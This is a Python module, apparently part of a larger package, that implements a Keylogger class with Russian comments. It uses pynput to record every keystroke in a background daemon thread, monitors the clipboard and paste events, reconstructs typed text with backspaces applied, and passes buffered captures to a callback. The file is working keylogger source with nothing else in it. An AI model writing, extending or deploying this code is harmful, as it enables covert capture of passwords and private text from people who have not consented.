import threading
from pynput import keyboard
from typing import Callable
from .clipboard import ClipboardMonitor
from .formatters import DefaultFormatter
from .key_mappings import special_keys

class Keylogger:
    def __init__(self, callback: Callable[[str], None], formatter = None, buffer_size = 50):
        """
        :param callback: Функция для обработки данных (будет передана в ClipboardMonitor)
        """
        self.callback = callback
        self.listener = None
        self.formatter = formatter or DefaultFormatter()
        self.raw_buffer = ""
        self.clean_buffer = ""
        self.buffer_size = buffer_size
        self.clipboard = ClipboardMonitor(callback=self._process_clipboard_data)
        self.ctrl_pressed = False
        self.special_keys = special_keys

    def start(self):
        """Запускает все мониторы"""
        self.listener = keyboard.Listener(
            on_press=self._on_press,
            on_release=self._on_release
        )
        self.listener.daemon = True
        self.listener.start()
        self.clipboard.start()
        return self

    def stop(self):
        """Останавливает все мониторы"""
        if self.listener:
            self.listener.stop()
        self.clipboard.stop()

    def _on_press(self, key):
        try:
            if key in [keyboard.Key.ctrl_l, keyboard.Key.ctrl_r, 
                      keyboard.Key.cmd_l, keyboard.Key.cmd_r]:
                self.ctrl_pressed = True
                return

            if self.ctrl_pressed and key == keyboard.KeyCode.from_char('v'):
                self._flush_buffers()
                self.clipboard.handle_paste()
                return

            key_str = self._format_key(key)
            raw, clean = key_str
            self.raw_buffer += raw
            if clean is not None:
                if clean == '\b':  # Обработка backspace
                    self.clean_buffer = self.clean_buffer[:-1]  # Удаляем последний символ
                else:
                    self.clean_buffer += clean

            if len(self.raw_buffer) >= self.buffer_size:
                self._flush_buffers()

        except Exception as e:
            self.callback(f"[KEY ERROR] {str(e)}")

    def _on_release(self, key):
        if key in [keyboard.Key.ctrl_l, keyboard.Key.ctrl_r,
                  keyboard.Key.cmd_l, keyboard.Key.cmd_r]:
            self.ctrl_pressed = False

    def _format_key(self, key):
        """Форматирует клавишу для отправки"""
        if hasattr(key, 'char') and key.char:
            return (key.char, key.char)
        return self.special_keys.get(key, (f"[{key}]", None)) 

    def _process_clipboard_data(self, data: str):
        """Обработчик для PASTE и CLIPBOARD"""
        try:
            if data.startswith(("[PASTE]", "[CLIPBOARD]")):
                self.callback(self.formatter.format_clipboard(data))
        except Exception as e:
            self.callback(f"[CLIPBOARD ERROR] {str(e)}")

    def _flush_buffers(self):
        """Отправка нажатий клавиш"""
        if not self.raw_buffer:
            return
            
        try:
            formatted = self.formatter.format_raw(
                raw=self.raw_buffer,
                clean=self.clean_buffer if hasattr(self, 'clean_buffer') else ""
            )
            self.callback(formatted)
        except Exception as e:
            self.callback(f"[FLUSH ERROR] {str(e)}")
        finally:
            self.raw_buffer = ""
            if hasattr(self, 'clean_buffer'):
                self.clean_buffer = ""